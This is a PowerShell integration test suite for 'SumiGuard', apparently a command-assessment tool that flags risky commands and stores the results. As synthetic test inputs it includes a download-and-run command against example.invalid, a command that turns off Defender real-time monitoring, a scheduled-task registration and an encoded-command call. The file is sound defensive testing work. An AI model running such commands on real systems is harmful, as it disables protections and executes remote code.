Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'
$script:Results = New-Object System.Collections.Generic.List[object]
$script:Stage = 'INITIALIZATION'
$root = Split-Path -Parent $PSScriptRoot
$runner = Join-Path $root 'demo\Invoke-SumiGuardManagedAssessmentStoreDemo.ps1'

function Assert-Integration { param([bool]$Condition,[string]$Code) $script:Stage=$Code; if(-not $Condition){throw [InvalidOperationException]::new()} }
function Test-Case { param([string]$Name,[scriptblock]$Body) try { & $Body; $script:Results.Add([pscustomobject]@{name=$Name;result='PASS';failure_stage=$null}) } catch { $script:Results.Add([pscustomobject]@{name=$Name;result='FAIL';failure_stage=$script:Stage}) } }
function New-Store { Join-Path ([IO.Path]::GetTempPath()) ('sumi-guard-integration-test-' + [Guid]::NewGuid().ToString('N')) }
function New-ManagedExecutionDouble { [pscustomobject]@{execution_started=$true;execution_start_count=0;execution_status='SUCCEEDED';stdout_matches_expected=$true;exit_code=0;stderr_nonempty=$false;timed_out=$false} }
function Get-SafeDisplayDouble { @('評価結果詳細','種別: 管理下実行の評価','判定: 対応範囲で該当なし') }

try {
  . $runner
  Test-Case 'ENTRYPOINT_PRESERVES_STORE_AND_RUN_SWITCH_PARAMETERS' {
    $store=New-Store; $lines=@(& $runner -StorePath $store);$code=$LASTEXITCODE;$report=$lines[$lines.Count-1]|ConvertFrom-Json
    Assert-Integration ($lines.Count -eq 1) 'ENTRYPOINT_ONE_REPORT'
    Assert-Integration ($code -eq 0 -and $report.success -and $report.assessment_saved -and $report.readback_contains_assessment -and $report.assessment_displayed -and $report.display_labels_confirmed) 'ENTRYPOINT_DRY_SUCCESS'
    Assert-Integration ($report.execution_start_count -eq 0 -and $report.execution_status -ceq 'NOT_EXECUTED') 'ENTRYPOINT_DRY_NO_CHILD'
    Remove-Item -LiteralPath $store -Recurse -Force
  }
  Test-Case 'SYNTHETIC_THREE_RULES_FOUR_STATES_PARTIAL_SAVE_AND_READBACK' {
    Initialize-SumiGuardManagedAssessmentStoreIntegration
    $store=New-Store; $null=SumiGuard.AssessmentStore\New-SumiGuardAssessmentStore -StorePath $store
    $cases=@(
      @{text='Invoke-WebRequest ''https://example.invalid/a.ps1'' -OutFile $p; & $p';status='DETECTED';rule='SG-CMD-001';reason=$null},
      @{text='Set-MpPreference -DisableRealtimeMonitoring $true';status='DETECTED';rule='SG-CMD-002';reason=$null},
      @{text='Register-ScheduledTask -TaskName ''Synthetic'' -Action $a';status='DETECTED';rule='SG-CMD-003';reason=$null},
      @{text='Get-ScheduledTask -TaskName ''Synthetic''';status='NO_DETECTION';rule=$null;reason=$null},
      @{text='powershell.exe -EncodedCommand synthetic';status='UNASSESSABLE';rule=$null;reason='ENCODED_PAYLOAD_NOT_INSPECTED'},
      @{text='Get-ChildItem';status='UNASSESSABLE';rule=$null;reason='UNSUPPORTED_LANGUAGE'} )
    $i=10; foreach($case in $cases){$assessment=SumiGuard.CommandAssessment\Invoke-SumiGuardCommandAssessment -CommandText $case.text -ExecutionId ('000000000000000000000000000000'+$i) -InterpreterKind $(if($case.reason -ceq 'UNSUPPORTED_LANGUAGE'){'UNKNOWN'}else{'WINDOWS_POWERSHELL'}) -InterpreterVerified ($case.reason -cne 'UNSUPPORTED_LANGUAGE'); Assert-Integration ($assessment.assessment_status -ceq $case.status) 'ASSESSMENT_STATUS';$actual=[string]$assessment.assessment_reason_code;$expected=if($null -eq $case.reason){''}else{[string]$case.reason};Assert-Integration ($actual -ceq $expected) 'ASSESSMENT_REASON';if($null -ne $case.rule){Assert-Integration ($assessment.findings[0].rule_id -ceq $case.rule) 'RULE_ID'};$saved=SumiGuard.AssessmentStore\Save-SumiGuardAssessment -StorePath $store -Assessment $assessment -EvaluationOrigin 'SYNTHETIC_TEST' -RelatedExecutionId $null;Assert-Integration $saved.success 'SYNTHETIC_SAVE';$i++}
    $partial=SumiGuard.CommandAssessment\Invoke-SumiGuardCommandAssessment -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $true; & $dynamicCommand' -ExecutionId '00000000000000000000000000000020' -InterpreterKind 'WINDOWS_POWERSHELL' -InterpreterVerified $true
    Assert-Integration ($partial.assessment_status -ceq 'DETECTED' -and $partial.assessment_reason_code -ceq 'PARTIAL_UNASSESSABLE') 'PARTIAL_ASSESSMENT';$saved=SumiGuard.AssessmentStore\Save-SumiGuardAssessment -StorePath $store -Assessment $partial -EvaluationOrigin 'SYNTHETIC_TEST' -RelatedExecutionId $null;Assert-Integration $saved.success 'PARTIAL_SAVE'
    $read=SumiGuard.AssessmentStore\Get-SumiGuardAssessmentRecord -StorePath $store;Assert-Integration ($read.success -and $read.record_count -eq 7) 'READBACK';$serialized=$read.records|ConvertTo-Json -Depth 8 -Compress;Assert-Integration (-not $serialized.Contains('example.invalid') -and -not $serialized.Contains('dynamicCommand')) 'NO_CONTENT_LEAK';Remove-Item -LiteralPath $store -Recurse -Force
  }
  Test-Case 'MANAGED_TEST_DOUBLE_SAVES_RELATED_EXECUTION_ID_WITHOUT_CHILD' {
    $store=New-Store;$report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $true -AssessmentStorePath $store -ManagedExecutionInvoker ${function:New-ManagedExecutionDouble} -DisplayInvoker ${function:Get-SafeDisplayDouble}
    Assert-Integration ($report.assessment_obtained -and $report.assessment_saved -and $report.assessment_displayed) 'MANAGED_STAGES';Assert-Integration ($report.evaluation_origin -ceq 'MANAGED_EXECUTION' -and $report.execution_start_count -eq 0) 'MANAGED_ORIGIN_NO_CHILD'
    $read=SumiGuard.AssessmentStore\Get-SumiGuardAssessmentRecord -StorePath $store;Assert-Integration ($read.success -and $read.records[0].execution_id -match '^[0-9a-f]{32}$' -and $read.records[0].evaluation_origin -ceq 'MANAGED_EXECUTION') 'MANAGED_RELATED_ID';Remove-Item -LiteralPath $store -Recurse -Force
  }
  Test-Case 'EVALUATION_AND_INTEGRATION_FAILURES_ARE_DISTINGUISHED' {
    Initialize-SumiGuardManagedAssessmentStoreIntegration;$assessmentModule=(Get-Module SumiGuard.CommandAssessment);$assessmentModule.SessionState.PSVariable.Set('SumiGuardTestForceEvaluationFailure',$true);try{$store=New-Store;$report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $true -AssessmentStorePath $store -DisplayInvoker ${function:Get-SafeDisplayDouble};Assert-Integration ($report.assessment_obtained -and $report.assessment_status -ceq 'EVALUATION_FAILED' -and $report.assessment_reason_code -ceq 'RULE_ENGINE_ERROR') 'EVALUATOR_FAILURE';Remove-Item -LiteralPath $store -Recurse -Force}finally{$assessmentModule.SessionState.PSVariable.Set('SumiGuardTestForceEvaluationFailure',$false)}
    $report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $false -AssessmentStorePath ([IO.Path]::GetTempPath());Assert-Integration (-not $report.assessment_obtained -and $null -eq $report.assessment_status -and $report.integration_status -ceq 'STORE_INITIALIZATION_FAILED') 'STORE_FAILURE_DISTINCT'
    $store=New-Store;$storeModule=(Get-Module SumiGuard.AssessmentStore);$storeModule.SessionState.PSVariable.Set('SumiGuardAssessmentStoreTestForceAtomicWriteFailure',$true);try{$report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $false -AssessmentStorePath $store;Assert-Integration ($report.assessment_obtained -and $report.assessment_status -ceq 'NO_DETECTION' -and $report.integration_status -ceq 'ASSESSMENT_SAVE_FAILED') 'SAVE_FAILURE_DISTINCT'}finally{$storeModule.SessionState.PSVariable.Set('SumiGuardAssessmentStoreTestForceAtomicWriteFailure',$false);if(Test-Path $store){Remove-Item -LiteralPath $store -Recurse -Force}}
    $store=New-Store;$report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $false -AssessmentStorePath $store -DisplayInvoker { throw [IO.InvalidDataException]::new() };Assert-Integration ($report.assessment_obtained -and $report.assessment_saved -and $report.integration_status -ceq 'ASSESSMENT_DISPLAY_FAILED') 'DISPLAY_FAILURE_DISTINCT';Remove-Item -LiteralPath $store -Recurse -Force
    $store=New-Store;$report=Invoke-SumiGuardManagedAssessmentStoreDemo -RunRequested $false -AssessmentStorePath $store -ReadbackInvoker { [pscustomobject]@{success=$false;record_count=0} };Assert-Integration ($report.assessment_obtained -and $report.assessment_saved -and $report.integration_status -ceq 'ASSESSMENT_READBACK_FAILED') 'READBACK_FAILURE_DISTINCT';Remove-Item -LiteralPath $store -Recurse -Force
  }
} catch { $script:Results.Add([pscustomobject]@{name='TOP_LEVEL';result='FAIL';failure_stage=$script:Stage}) }
$failed=@($script:Results|Where-Object{$_.result -cne 'PASS'}).Count
[pscustomobject]@{success=($failed -eq 0);test_count=$script:Results.Count;passed_count=$script:Results.Count-$failed;failed_count=$failed;tests=$script:Results.ToArray();managed_child_start_count=0;suspicious_inputs_executed=$false;command_content_saved=$false;raw_streams_emitted=$false}|ConvertTo-Json -Depth 5 -Compress
if($failed -eq 0){exit 0}else{exit 1}
